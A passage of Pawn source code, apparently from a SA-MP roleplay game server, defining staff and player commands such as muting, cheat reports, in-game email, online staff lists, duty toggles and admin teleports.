		    if(lastquestion[playerid] != -1)
		    {
		        GetPlayerName(lastquestion[playerid], giveplayer, sizeof(giveplayer));
    			if(PlayerInfo[playerid][pAdmin] >= 1)
				{
       				format(string, sizeof(string), "*  (/ndelete) <- %s -> %s", sendername, giveplayer);
					format(string2, sizeof(string2), "* Admin %s you wiped Questions.", sendername, giveplayer, message);
				}
				else if(PlayerInfo[playerid][pHelper] >= 1)
				{
					format(string, sizeof(string), "* HCMD: (/ndelete) <- %s -> %s", sendername, giveplayer);
					format(string2, sizeof(string2), "* Helper %s you wiped Questions.", sendername, giveplayer, message);
				}
				foreach(Player,x)
				{
    				if(PlayerInfo[x][pNewbieEnabled] == 1)
					{
        				if(PlayerInfo[x][pAdmin] >= 1 || PlayerInfo[x][pHelper] >= 1)
						{
							SendClientMessage(x,COLOR_YELLOW,string);
						}
						if(x == lastquestion[playerid])
						{
							SendClientMessage(x,COLOR_YELLOW,string2);
						}
					}
				}
				PlayerInfo[lastquestion[playerid]][pNMessage] = 0;
				PlayerInfo[lastquestion[playerid]][pNMessage2] = 0;
				PlayerInfo[lastquestion[playerid]][pFirstAnswer] = 0;
				aprimitintrebarea[lastquestion[playerid]] = -1;
				PlayerInfo[playerid][pHelpedPlayers]++;
				lastquestion[playerid] = -1;
				timefornextquestion[playerid] = 5;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "You have got a question.");
	}
	return 1;
}
CMD:nmute(playerid, params[])
{
    if(PlayerInfo[playerid][pHelper] >= 1 || PlayerInfo[playerid][pAdmin] >= 1)
	{
        new id,time,sendername[30],giveplayer[30],string[256];
    	if(sscanf(params, "ud", id, time))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/nmute <Name/Playerid> <Minutes>");
			return 1;
		}
		else
		{
		    if(IsPlayerConnected(id))
			{
		        GetPlayerName(playerid, sendername, sizeof(sendername));
		        GetPlayerName(id, giveplayer, sizeof(giveplayer));
		        PlayerInfo[id][pNMuted] = time * 60;
		        Update(id,pNMutedx);
		        format(string, sizeof(string), "%s has muted you on /n for %d minutes.", sendername, time);
		        SendClientMessage(id,COLOR_SERVER,string);
		        format(string, sizeof(string), "%s has been muted from /n by %s for %d minutes.", giveplayer, sendername, time);
                ABroadCast(COLOR_RED,string,1);
				HLChat(COLOR_RED,string);
				format(string, sizeof(string), "You have muted %s for %d minutes.", giveplayer, time);
		        SendClientMessage(playerid,COLOR_SERVER,string);
			}
			else return SendClientMessage(playerid, COLOR_GREY, "The specified player ID is either not connected or has not authenticated.");
		}
	}
	return 1;
}
CMD:cheat(playerid, params[])
{
    new id,reason[300],sendername[30],giveplayer[30],string[256];
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(ReportTime[playerid] == 1) return SCM(playerid, COLOR_SERVER,"{ba9789}You can send a report once every 3 minutes..");
    if(IsPlayerConnected(playerid))
    {
   		if(sscanf(params, "us[300]", id, reason)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/cheat <id cheater> <reason>");
	    if(IsPlayerConnected(id))
		{
	        GetPlayerName(playerid, sendername, sizeof(sendername));
	        GetPlayerName(id, giveplayer, sizeof(giveplayer));
			SendClientMessage(playerid, COLOR_YELLOW, "Report submitted.");
	        format(string, sizeof(string), "%s [%d] was reported for cheating by %s: %s.",giveplayer,id,sendername,reason);
            reportcheater[playerid] = id;
			ABroadCast(COLOR_REPORT,string,1);
			ReportTime[playerid] = 1;
 			timerreport[playerid] = 180;
		}
		else return SendClientMessage(playerid, COLOR_GREY, "The specified player ID is either not connected or has not authenticated.");
	}
	return 1;
}
CMD:resethelp(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 6)
	{
        new
            id;
        if(sscanf(params, "u", id))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/resethelp <Name/Playerid>");
			return 1;
		}
		else
		{
	    	if(IsPlayerConnected(id))
			{
	        	if(PlayerInfo[id][pHelpedPlayers] >= 1)
				{
				    new sendername[30],giveplayer[30],string[256];
	            	PlayerInfo[id][pHelpedPlayers] = 0;
	            	Update(id,pHelpedPlayersx);
	            	GetPlayerName(playerid, sendername, sizeof(sendername));
	            	GetPlayerName(id, giveplayer, sizeof(giveplayer));
	            	format(string, sizeof(string), "Your helped players has been reseted by admin %s.", sendername);
					SendClientMessage(id, COLOR_YELLOW, string);
			 		format(string, sizeof(string), "You have reseted %s helped players.", giveplayer);
					SendClientMessage(playerid, COLOR_YELLOW, string);
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "This player doesn't have helped players.");
			}
			else return SendClientMessage(playerid, COLOR_GREY, "The specified player ID is either not connected or has not authenticated.");
		}
	}
	return 1;
}
CMD:email(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    new result[300],message[300],string[1000],read,message2[40],finalmessage[40],query[500],emailid,idd=0;
	    format(query, sizeof(query), "SELECT * FROM `emails` WHERE `playerid` = '%d' ORDER BY `ID` DESC LIMIT 10", PlayerInfo[playerid][pSQLID]);
		new Cache: emailresult = mysql_query(SQL, query);
		if(cache_get_row_count() > 0)
		{
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
		    	cache_get_field_content(i, "Message", result); format(message, sizeof(message), result);
		    	read                    = cache_get_field_content_int(i, "EmailRead");
		    	emailid                 = cache_get_field_content_int(i, "ID");
		    	EmailId[playerid][idd] = emailid;
		    	idd++;
		    	if(strlen(message) > 28)
		    	{
		    		strmid(message2, message, 0, 29, sizeof(message2));
      				format(finalmessage,sizeof(finalmessage), "%s...",message2);
				}
		   	 	if(read > 0)
		    	{
		    		format(string, sizeof(string), "%s[NECITIT]%s\n", string, finalmessage);
				}
				else
				{
			    	format(string, sizeof(string), "%s%s\n", string, finalmessage);
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "You don't have a email!");
		cache_delete(emailresult);
        ShowPlayerDialog(playerid,DIALOG_EMAILS,DIALOG_STYLE_LIST,"Emails",string,"Read","Exit");
	}
	return 1;
}
/*CMD:admins(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
        new string[200],sendername[30];
		SendClientMessage(playerid, COLOR_SERVER, "{408080}-----Admins Online------------------------");
		foreach(Player,i)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerInfo[i][pAdmin] == 1)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{EEEEEE} (%d) %s - admin level 1", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			    if(PlayerInfo[i][pAdmin] == 2)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{EEEEEE} (%d) %s - admin level 2", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			    if(PlayerInfo[i][pAdmin] == 3)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{EEEEEE} (%d) %s - admin level 3", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			    if(PlayerInfo[i][pAdmin] == 4)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{EEEEEE} (%d) %s - admin level 4", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			    if(PlayerInfo[i][pAdmin] == 5)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{EEEEEE} (%d) %s - admin level 5", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
				if(PlayerInfo[i][pAdmin] == 6)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{EEEEEE} (%d) %s - admin level 6", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			}
	    }
	    SendClientMessage(playerid, COLOR_SERVER, "{408080}--------------------------------------------");
		SendClientMessage(playerid, COLOR_SERVER, "Daca ai vreo problema, poti folosi /report. Pentru intrebari legate de joc poti folosi /n.");
		SendClientMessage(playerid, COLOR_SERVER, "{408080}--------------------------------------------");
 	}
	return 1;
}
*/
CMD:admins(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
        new string[200],sendername[30];
		SendClientMessage(playerid, 0x95C730FF, "|____________Admins Online___________|");
		foreach(Player,i)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerInfo[i][pAdmin] == 1)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{7FFF00}ID: %d Nick: %s Admin Level: 1", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			    if(PlayerInfo[i][pAdmin] == 2)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{7FFF00}ID: %d Nick: %s - Admin Level: 2", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			    if(PlayerInfo[i][pAdmin] == 3)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{7FFF00}ID: %d Nick: %s - Admin Level: 3", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			    if(PlayerInfo[i][pAdmin] == 4 )
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{7FFF00}ID: %d Nick: %s - Admin Level: 4", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			    if(PlayerInfo[i][pAdmin] == 5)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{7FFF00}ID: %d Nick: %s - Admin LeveL: 5", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
				if(PlayerInfo[i][pAdmin] == 6)
			    {
					GetPlayerName(i, sendername, sizeof(sendername));
					format(string, 256, "{7FFF00}ID: %d Nick: %s - Supervisor", i, sendername);
					SendClientMessage(playerid, -1, string);
				}
			}
	    }
 	}
 	SendClientMessage(playerid, 0x95C730FF, "[____________________________________]");
	return 1;
}
/*CMD:helpers(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
        new string[200],sendername[30];
		SendClientMessage(playerid, COLOR_SERVER, "{408080}----Helpers Online-----------------------");
		foreach(Player,i)
		{
		    if(IsPlayerConnected(i))
			{
				if(PlayerInfo[i][pHelper] == 1)
			    {
			    	GetPlayerName(i, sendername, sizeof(sendername));
				    format(string, 256, "{EEEEEE} (%d) %s - helper level 1", i, sendername);
			        SendClientMessage(playerid,-1, string);
			    }
       			if(PlayerInfo[i][pHelper] == 2)
			    {
			    	GetPlayerName(i, sendername, sizeof(sendername));
				    format(string, 256, "{EEEEEE} (%d) %s - helper level 2", i, sendername);
			        SendClientMessage(playerid,-1, string);
			    }
       			if(PlayerInfo[i][pHelper] == 3)
			    {
			    	GetPlayerName(i, sendername, sizeof(sendername));
				    format(string, 256, "{EEEEEE} (%d) %s - helper level 3", i, sendername);
			        SendClientMessage(playerid,-1, string);
			    }
			}
	    }
 	}
 	SendClientMessage(playerid, COLOR_SERVER, "{408080}-------------------------------------------");
	SendClientMessage(playerid, COLOR_SERVER, "Daca ai vreo intrebare legata de server, foloseste /n.");
	SendClientMessage(playerid, COLOR_SERVER, "{408080}-------------------------------------------");
	return 1;
}*/
CMD:helpers(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
        new string[200],sendername[30];
		SendClientMessage(playerid, 0x95C730FF, "|____________Helpers Online___________|");
		foreach(Player,i)
		{
		    if(IsPlayerConnected(i))
			{
				if(PlayerInfo[i][pHelper] == 1)
			    {
			    	GetPlayerName(i, sendername, sizeof(sendername));
				    format(string, 256, "{FF6347}ID: %d Nick: %s {7FFF00}Helper Level: 1", i, sendername);
			        SendClientMessage(playerid,-1, string);
			    }
       			if(PlayerInfo[i][pHelper] == 2)
			    {
			    	GetPlayerName(i, sendername, sizeof(sendername));
				    format(string, 256, "{FF6347}ID: %d Nick: %s {7FFF00}Helper Level: 2", i, sendername);
			        SendClientMessage(playerid,-1, string);
			    }
       			if(PlayerInfo[i][pHelper] == 3)
			    {
			    	GetPlayerName(i, sendername, sizeof(sendername));
				    format(string, 256, "{FF6347}ID: %d Nick: %s {7FFF00}Helper Level: 3", i, sendername);
			        SendClientMessage(playerid,-1, string);
			    }
			}
	    }
 	}
 	SendClientMessage(playerid, 0x95C730FF, "[______________________________________________________]");
 	SendClientMessage(playerid, COLOR_SERVER, "Agar Dar Ravand Bazi Khod Moshkeli Darid Az Cmd /n Estefade Konid.");
 	SendClientMessage(playerid, 0x95C730FF, "[______________________________________________________]");
	return 1;
}

CMD:hduty(playerid, params[])
{
	if(lastquestion[playerid] != -1) return SCM(playerid, COLOR_ERROR, "First answer the question received or type /ndelete");
	if(PlayerInfo[playerid][pHelper] >= 1)
	{
	    if(HelperDuty[playerid] == 1)
	    {
	        new sendername[MAX_PLAYER_NAME], string[1000];
  			HelperDuty[playerid] = 0;
	       	SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			GetPlayerName(playerid, sendername, sizeof(sendername));
           	format(string, sizeof(string), "You are now off duty, you will not receive the question to the players.", sendername);
           	SendClientMessage(playerid,COLOR_SERVER,string);
	       	SetPlayerHealthEx(playerid,100);
	       	SetPlayerArmourEx(playerid,0);
		}
		else
	    {
	    	new sendername[MAX_PLAYER_NAME], string[1000];
			HelperDuty[playerid] = 1;
			SetPlayerSkin(playerid, 217);
			SetPlayerHealthEx(playerid,999);
			SetPlayerArmourEx(playerid,999);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Now you're on duty, you will receive the question from players.", sendername);
			SendClientMessage(playerid,COLOR_SERVER,string);
	    }
	}
	else
	{
		SendClientMessage(playerid,COLOR_GREY,"Error: You're not helper.");
	}
	return 1;
}
CMD:aduty(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(gPlayerLogged[playerid] == 0)
	    {
	        SendClientMessage(playerid, COLOR_GREY, "{ffffff}Sorry, you are not logged in to use this command!");
			return 1;
	    }
	    if(PlayerInfo[playerid][pAdmin] > 0)
	    {
	        if(AdminDuty[playerid] == 0)
	        {
	            new sendername[MAX_PLAYER_NAME], string[256];
	            AdminDuty[playerid] = 1;
	            SetPlayerArmourEx(playerid, 999);
				SetPlayerHealthEx(playerid, 999);
				SetPlayerSkin(playerid, 217);
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}Admin %s is now on administrative duty.", sendername);
				ABroadCast(COLOR_AdminWarn,string,1);
				if(PlayerInfo[playerid][pAdmin] >= 5)
				{
				    for(new i = 0; i < sizeof(CarInfo); i++)
					{
						SetVehicleParamsForPlayer(i,playerid,0,0);
					}
				}
				return 1;
	        }
	        else if(AdminDuty[playerid] == 1)
	        {
	            new sendername[MAX_PLAYER_NAME], string[256];
	            AdminDuty[playerid] = 0;
	            SetPlayerArmourEx(playerid, 0);
				SetPlayerHealthEx(playerid, 100);
				SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}Admin %s is now off administrative duty.", sendername);
				ABroadCast(COLOR_AdminWarn,string,1);
				return 1;
	        }
	    }
	    else
	    {
	        SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	    }
	}
    return 1;
}

/*CMD:makeadmin(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 6 || EstiFondator(playerid))
		{
			new id,adminlevel,sendername[30],giveplayer[30],string[200],escape[200];
			if(sscanf(params, "ui",id,adminlevel)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/makeadmin` <Name/Playerid> <Admin Level>");
			if(PlayerInfo[id][pAdmin] >= 6 && !EstiFondator(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "Nu poti modifica admin level-ul unui admin 6+!.");
			if(adminlevel > 4 && !EstiFondator(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "Only founders can make admin higher than 4.");
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					printf("[Admin-Warn]: %s has promoted %s to a level %d admin.", sendername, giveplayer, adminlevel);
					format(string, sizeof(string), "You've been promoted to level %d admin, by %s.", adminlevel, sendername);
					SendClientMessage(id, COLOR_YELLOW, string);
					format(string, sizeof(string), "You have promoted %s to a level %d admin.", giveplayer,adminlevel);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string, sizeof(string), "* Admin %s set %s's admin level to %d.", sendername,giveplayer,adminlevel);
					ABroadCast(COLOR_ADMCHAT,string,1);
					HLChat(COLOR_ADMCHAT,string);
					mysql_real_escape_string(string, escape);
					PlayerInfo[id][pAdmin] = adminlevel;
					if(adminlevel == 0)
					{
						AdminDuty[id] = 0;
					}
					new str[256];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Admin`='%d' WHERE `name`='%s'",PlayerInfo[id][pAdmin],PlayerInfo[id][pNormalName]);
					mysql_tquery(SQL,str,"","");
					mysql_format(SQL,str, sizeof(str), "INSERT INTO staff_logs (`text`) VALUES ('%s')", escape);
					mysql_tquery(SQL,str,"","");
				}
			}
    		else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		    }
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
*/
CMD:makehelper(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 6)
		{
			new id,helperlevel,sendername[30],giveplayer[30],string[200],escape[200];
			if(sscanf(params, "ui",id,helperlevel)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/makehelper <Name/Playerid> <Helper Level>");
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					printf("[Admin-Warn]: {FFFFFF}%s has promoted %s to helper %d.", sendername, giveplayer,helperlevel);
					format(string, sizeof(string), "Administrator %s has promoted you to a level %d helper.", sendername,helperlevel);
					SendClientMessage(id, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have promoted %s to helper %d.", giveplayer,helperlevel);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Admin %s set %s's helper level to %d.", sendername,giveplayer,helperlevel);
					ABroadCast(COLOR_ADMIN,string,1);
					HLChat(COLOR_ADMIN,string);
					mysql_real_escape_string(string, escape);
					PlayerInfo[id][pHToken] = 0;
		 			Update(id, pHTokenx);
					PlayerInfo[id][pHelper] = helperlevel;
					new str[256];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Helper`='%d' WHERE `name`='%s'",PlayerInfo[id][pHelper],PlayerInfo[id][pNormalName]);
					mysql_tquery(SQL,str,"","");
					mysql_format(SQL,str, sizeof(str), "INSERT INTO staff_logs (`text`) VALUES ('%s')", escape);
					mysql_tquery(SQL,str,"","");
				}
			}
    		else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		    }
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}

CMD:togfind(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid,COLOR_ERROR, AdminOnly);
 	    if(togfind[playerid] == 1)
 	    {
 	        togfind[playerid] = 0;
 	        SCM(playerid,COLOR_SERVER,"Disable tog find.");
 	    }
 	    else
 	    {
 	    	togfind[playerid] = 1;
            SCM(playerid,COLOR_SERVER,"Enable tog find.");
	    }
	}
	return 1;
}

CMD:find(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "Trebuie sa te loghezi mai intai.");
	if(IsPlayerConnected(playerid))
 	{
		if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1)
		{
			new id,giveplayer[30],string[100];
			if(BusinessRob[playerid] > 0) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda in timp ce jefuiesti o afacere.");
			if(PlayerInfo[playerid][pJob] != 1 && !IsACop(playerid) && PlayerInfo[playerid][pMember] != 11)	return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Detective/Cop/Hitman.");
			if(sscanf(params, "u",id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/find <Name/Playerid>");
			if(IsPlayerConnected(id))
			{
				if(id != INVALID_PLAYER_ID)
				{
				    if(workdeja[playerid] == 1)
				    {
				        ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				    }
				    if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You can not find one.");
					if(togfind[id] == 1) return SCM(playerid,COLOR_SERVER,"{C1F589}Eroare: The player is offline.");
					UsedFind[playerid] = 1;
	    			GetPlayerName(id, giveplayer, sizeof(giveplayer));
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(id, X,Y,Z);	
					DisablePlayerCheckpoint(playerid);
					SetPlayerCheckpoint(playerid, X,Y,Z, 3.5);
					targetfind[playerid] = id;
					foreach(Player, i)
					{
					    if(IsACop(playerid))
					    {
					        if(caser[playerid] == i)
					        {
					            cased[i] --;
							}
						}
					}
					if(IsACop(playerid))
					{
					    cased[id] ++;
					    caser[playerid] = id;
					}
					format(string,sizeof(string),"{FFFF00}Checkpoint will display the player's location %s. The distance to the player: %.0f.",giveplayer,GetDistanceBetweenPlayers(playerid, id));
					SCM(playerid,COLOR_SERVER,string);
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
		}
	}
 	return 1;
}

CMD:gethere(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 3)
		{
			new plo,sendername[30],giveplayer[30],string[256];
			if(sscanf(params, "u",plo)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/gethere <Name/Playerid>");
			new Float:plocx,Float:plocy,Float:plocz;
		    if (IsPlayerConnected(plo))
		    {
		     	if(plo != INVALID_PLAYER_ID)
			    {
					GetPlayerPos(playerid, plocx, plocy, plocz);
					SetPlayerInterior(plo,GetPlayerInterior(playerid));
					PlayerInfo[plo][pInt] = PlayerInfo[playerid][pInt];
					PlayerInfo[plo][pLocal] = PlayerInfo[playerid][pLocal];
					if (GetPlayerState(plo) == 2)
					{
						TelePos[plo][0] = 0.0;
						TelePos[plo][1] = 0.0;
						new tmpcar = GetPlayerVehicleID(plo);
						SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
					}
					else
					{
						SetPlayerPosEx(plo,plocx,plocy+2, plocz);
					}
					if(InHouse[playerid] > 0)
					{
						InHouse[plo] = InHouse[playerid];
						if(strlen(housestring[InHouse[plo]]) > 0)
						{
					    	StopAudioStreamForPlayer(plo);
							PlayAudioStreamForPlayer(plo, housestring[InHouse[plo]]);
						}
					}
					if(InHQ[playerid] > 0)
					{
						InHQ[plo] = InHQ[playerid];
					}
					if(InBussines[playerid] > 0)
					{
						InBussines[plo] = InBussines[playerid];
					}
					SetPlayerVirtualWorld(plo, GetPlayerVirtualWorld(playerid));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerName(plo, giveplayer, sizeof(giveplayer));
					format(string,sizeof(string),"You have teleported %s to you.",giveplayer);
					SendClientMessage(playerid, COLOR_GRAD1, string);
					format(string,sizeof(string),"You have been teleported by admin %s.",sendername);
					SendClientMessage(plo, COLOR_GRAD1, string);
					format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}%s used /gethere on %s.",sendername,giveplayer);
					if(PlayerInfo[plo][pAdmin] > 0 || PlayerInfo[plo][pHelper] > 0)
					{
						ABroadCast(COLOR_AdminWarn,string,1);
					}
				    Adminlog(string);
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
		}
		else
		{
				SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotoxyz(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		new string[128],interior,vw;
		new Float:x, Float:y, Float:z;
		if(sscanf(params, "fffii", x,y,z,interior,vw)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/gotoxyz <x> <y> <z> <interior> <virtual world>");
		{
			SetPlayerPosEx(playerid, x, y, z);
			format(string,sizeof(string),"You've teleported to x = %f, y = %f, z = %f, interior %d.",x,y,z,interior);
			SendClientMessage(playerid,COLOR_SERVER, string);
			SetPlayerVirtualWorld(playerid, vw);
			SetPlayerInterior(playerid,interior);
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
   			StopAudioStreamForPlayer(playerid);
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:gotolv(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[64],sendername[25];
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1699.2, 1435.1, 10.7);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, 1699.2,1435.1, 10.7);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Warning: Admin %s Teleported to LV.", sendername);
			Adminlog(string);
			if(InHouse[playerid] > -1)
			{
			    StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotosf(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[64],sendername[25];
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1417.0,-295.8,14.1);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, -1417.0,-295.8,14.1);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "AdmWarning: Admin %s Teleported to SF.", sendername);
			Adminlog(string);
			if(InHouse[playerid] > -1)
			{
   				StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotostad(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1435.75, -652.664, 1054.94);
			}
			else
			{
				SetPlayerPosEx(playerid, -1435.75, -652.664, 1054.94);
			}
			SetPlayerInterior(playerid,4);
